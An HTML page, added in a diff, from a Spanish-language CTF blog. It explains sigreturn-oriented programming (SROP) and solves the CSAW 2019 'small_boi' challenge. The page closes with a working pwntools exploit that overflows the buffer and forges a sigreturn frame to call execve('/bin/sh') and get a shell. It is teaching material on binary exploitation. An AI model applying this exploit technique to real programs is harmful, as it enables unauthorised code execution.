@@ -1,0 +1,556 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="es" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Programación Orientada a Sigreturn (SROP) - c4rta</title>
+<meta name="description" content="Resolucion de un ejercicio aplicando la tecnica SROP">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="es_ES">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:title" content="Programación Orientada a Sigreturn (SROP)">
+<meta property="og:url" content="http://localhost:4000/srop/">
+
+
+  <meta property="og:description" content="Resolucion de un ejercicio aplicando la tecnica SROP">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2023-01-09T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/srop/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "c4rta",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categorias/" >Categorias</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Programación Orientada a Sigreturn (SROP)</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="c4rta" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">c4rta</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        CTFs<br>Enstusiasta a la ciberseguridad
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/ic4rta" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Programación Orientada a Sigreturn (SROP)">
+    <meta itemprop="description" content="Resolucion de un ejercicio aplicando la tecnica SROP">
+    <meta itemprop="datePublished" content="January 09, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Programación Orientada a Sigreturn (SROP)
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-01-09T00:00:00-06:00">January 09, 2023 </time>&emsp;
+          
+          
+        </p>
+        <h2 id="señales">Señales</h2>
+
+<p>Las señales son un mecanismo para enviar notificaciones asincrónicas directamente a un proceso o subproceso. Este se utilizan para matar procesos, para decirles que los temporizadores han expirado o para notificar sobre un comportamiento anormal.</p>
+
+<h3 id="funcion-de-las-señales">Funcion de las señales</h3>
+
+<p><img src="/assets/images/srop/se%C3%B1al.webp" alt="" /></p>
+
+<ol>
+  <li>
+    <p>Cuando se tiene un proceso previamente creado, lo que se hace primero es que el kernel envia una señal a ese proceso, el proceso se suspende temporalmente y entrara en el kernel</p>
+  </li>
+  <li>
+    <p>Despues, el kernel guarda el contexto de ese proceso y salta al controlador de la señal (este ya debe de estar previamente definido)</p>
+  </li>
+  <li>
+    <p>Cuando se vuelve e pasar el kernel, el controlador de la señal regresa, y el kernel restaura el contexto del proceso</p>
+  </li>
+  <li>
+    <p>Ejecucion del proceso</p>
+  </li>
+</ol>
+
+<p>Del paso 2 al 3 es la clave. SROP abusa de <code class="language-plaintext highlighter-rouge">sigreturn()</code> por que normalmente restaura el contexto del proceso despues de que regresa el controlador de señal, esto funciona mas o menos asi:</p>
+
+<p>El kernel guarda el contexto del proceso en el stack del proceso, luego se usa la direccion de <code class="language-plaintext highlighter-rouge">rt_sigreturn</code> en el top del stack, esta direccion apunta a un fragmento de codigo en el que <code class="language-plaintext highlighter-rouge">sigreturn()</code> llamara a sistema. Despues del paso 3, el RSP o ESP apunta a <code class="language-plaintext highlighter-rouge">rt_sigreturn</code> y ejecuta el codigo que se haya definido</p>
+
+<h3 id="srop">SROP</h3>
+
+<p>SROP es una variante de ROP, pero en esta solo se deben de cumplir dos condiciones</p>
+
+<ol>
+  <li>Un gadget <code class="language-plaintext highlighter-rouge">syscall; ret</code></li>
+  <li>Una manera de poner <code class="language-plaintext highlighter-rouge">0xf</code> en <code class="language-plaintext highlighter-rouge">RAX</code> o <code class="language-plaintext highlighter-rouge">EAX</code></li>
+</ol>
+
+<p>Dos de las formas mas usadas para poner <code class="language-plaintext highlighter-rouge">0xf</code> en <code class="language-plaintext highlighter-rouge">RAX</code> son:</p>
+
+<ol>
+  <li>Usar <code class="language-plaintext highlighter-rouge">mov eax, 0xf</code></li>
+  <li>Usar <code class="language-plaintext highlighter-rouge">pop eax; ret</code></li>
+</ol>
+
+<p>Ambas son faciles de implementar, ya que meten <code class="language-plaintext highlighter-rouge">0xf</code> en una sola acccion.
+Y el <code class="language-plaintext highlighter-rouge">0xf</code> simplemente es el <code class="language-plaintext highlighter-rouge">syscall ID de rt_sigreturn</code>.</p>
+
+<h2 id="como-funciona">Como funciona</h2>
+
+<p>Aun que es similar a ROP, no funcionan de la misma forma, SROP funciona poniendo en el call stack un <code class="language-plaintext highlighter-rouge">sigcontext</code> pero falso. y luego sobrescribir el <code class="language-plaintext highlighter-rouge">RIP</code> o <code class="language-plaintext highlighter-rouge">EIP</code> con la direccion de un gadget que permita llamar a <code class="language-plaintext highlighter-rouge">sigreturn()</code>, y se apunta a <code class="language-plaintext highlighter-rouge">sigreturn()</code> ya que este permite ejecutar el <code class="language-plaintext highlighter-rouge">sigcontext</code>, realmente esto es muy poderoso, ya que con SROP podemos controlar al mismo tiempo todos los valores de los registros</p>
+
+<h2 id="explotacion">Explotacion</h2>
+
+<p>Para el ejemplo usare un clasico, <code class="language-plaintext highlighter-rouge">smallboi</code> de CSAW 2019</p>
+
+<p>Al ejecutarlo simplemente se queda esperando un input y se cierra, y al tratar de desbordar el buffer vemos que si se puede:</p>
+
+<p><code class="language-plaintext highlighter-rouge">[1]    423456 segmentation fault (core dumped)  ./small_boi</code></p>
+
+<p>Pero tiene NX asi que no podemos ejecutar una shellcode</p>
+
+<h3 id="analizandolo">Analizandolo</h3>
+
+<p>Al materlo al radare, vemos y hacer un <code class="language-plaintext highlighter-rouge">pdf</code> vemos algo como esto:</p>
+
+<p><img src="/assets/images/srop/radare1.png" alt="" /></p>
+
+<p>Esto simplemente es el entry point, y lo unico interesante es que en la direccion <code class="language-plaintext highlighter-rouge">0x004001b6</code> hace un llamado a <code class="language-plaintext highlighter-rouge">fcn.0040018c</code>, asi que vamos pa’ alla</p>
+
+<p><img src="/assets/images/srop/radare2.png" alt="" /></p>
+
+<p>Este es su codigo, basicamente el binario hacer una syscall de <code class="language-plaintext highlighter-rouge">read()</code>, la cual es la funcion que recibe nuestro input, la cual lee <code class="language-plaintext highlighter-rouge">0x200</code> bytes que vienen de <code class="language-plaintext highlighter-rouge">var_20h</code></p>
+
+<h3 id="sacando-el-offset-el-rip">Sacando el offset el RIP</h3>
+
+<p>Esta es la parte mas sencilla, asi que realmente no requiere mucha explicacion, lo que hice fue:</p>
+
+<ol>
+  <li>Usando pwndbg genere con <code class="language-plaintext highlighter-rouge">cyclic 100</code> una secuencia de 100 caracteres que le pase como input al programa</li>
+  <li>Usando <code class="language-plaintext highlighter-rouge">cyclic -l 0x6161616161616166</code> optuve el offser el RIP, le pase esos 61, ya que es el valor que tiene el RIP, como se puede ver: <code class="language-plaintext highlighter-rouge">► 0x4001ac    ret    &lt;0x6161616161616166&gt;</code></li>
+</ol>
+
+<p>Y bueno, el offset es 40</p>
+
+<h3 id="sacando-el-gadget">Sacando el gadget</h3>
+
+<p>El binario apenas si tiene instrucciones y por consiguiente apenas y tendra los gadgets que son usados comunmente jaja, asi que ahora queda mostrar los gadgets usando <code class="language-plaintext highlighter-rouge">/R</code> en radare, a ver que onda.</p>
+
+<p>Despues de ver los gadgets nos encontramos con el que usaremos:</p>
+
+<p><img src="/assets/images/srop/radare3.png" alt="" /></p>
+
+<p>Aqui esta todo lo que ocupamos, este unico gadget hace las dos condiciones que mencion al principio, ya que establece a <code class="language-plaintext highlighter-rouge">EAX</code> el nuemero de la syscall equivalente a <code class="language-plaintext highlighter-rouge">sigreturn()</code> y la invoca. Tambien como mencione antes, en SROP se crear un <code class="language-plaintext highlighter-rouge">sigcontext</code> falso, asi que en esta caso haremos uno falso llamando a <code class="language-plaintext highlighter-rouge">execve()</code> con el arguemento <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
+
+<p>Para sacar <code class="language-plaintext highlighter-rouge">/bin/sh</code> simplemente podemos <code class="language-plaintext highlighter-rouge">/ /bin/sh</code> y vemos que nos arroja algo como esto:</p>
+
+<p><img src="/assets/images/srop/radare4.png" alt="" /></p>
+
+<p>Donde la direccion de <code class="language-plaintext highlighter-rouge">/bin/sh</code> es la que esta seleccionada</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>Al conseguir todo, nuestro exploit queda asi:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./small_boi"</span><span class="p">)</span>
+
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x4001ca</span>
+<span class="n">sigreturn</span> <span class="o">=</span> <span class="mh">0x400180</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x400185</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>
+
+<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">bin_sh</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Y los valores salieron de aca:</p>
+
+<p><img src="/assets/images/srop/radare5.png" alt="" /></p>
+
+<p>Con <code class="language-plaintext highlighter-rouge">SigreturnFrame</code> Podemos crear un <code class="language-plaintext highlighter-rouge">sigcontext</code> falso, donde se establece <code class="language-plaintext highlighter-rouge">rax</code> a 59 (para execve), <code class="language-plaintext highlighter-rouge">rdi</code> a la dirección del <code class="language-plaintext highlighter-rouge">/bin/sh</code>, <code class="language-plaintext highlighter-rouge">rsi</code> y <code class="language-plaintext highlighter-rouge">rdx</code> ambos a 0, y <code class="language-plaintext highlighter-rouge">rip</code> hacia ls <code class="language-plaintext highlighter-rouge">syscall</code>, esto con el fin de que la <code class="language-plaintext highlighter-rouge">rt_sigreturn</code> syscall cambie de contexto usando estos valores del falso <code class="language-plaintext highlighter-rouge">sigcontext</code>, llamando así a <code class="language-plaintext highlighter-rouge">execve</code> con <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+
+<p>Y el ejecutarlo nos da la shell:</p>
+
+<p><img src="/assets/images/srop/exploit.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/images/srop/waifu.jpg" alt="" /></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#rop" class="page__taxonomy-item" rel="tag">rop</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#srop" class="page__taxonomy-item" rel="tag">srop</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#explotacion-binaria" class="page__taxonomy-item" rel="tag">Explotacion binaria</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-01-09T00:00:00-06:00">January 09, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/TAMU-2019-pwn1/" class="pagination--pager" title="TAMU 2019 pwn1 - BufferOverflow
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 c4rta</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
